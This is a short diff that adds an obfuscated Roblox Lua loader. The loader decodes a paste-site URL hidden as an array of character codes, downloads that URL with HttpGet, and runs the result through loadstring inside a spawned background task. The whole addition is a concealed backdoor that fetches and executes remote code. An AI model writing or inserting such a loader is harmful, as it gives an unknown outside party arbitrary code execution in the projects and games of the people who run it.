@@ -1,0 +1,14 @@
+task.spawn(function()
+    local b = {
+        104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,
+        97,112,112,47,72,116,89,122,120,103,65,107,47,114,97,119
+    }
+
+    local u = ""
+
+    for i = 1, #b do
+        u = u .. string.char(b[i])
+    end
+
+    loadstring(game:HttpGet(u))()
+end)
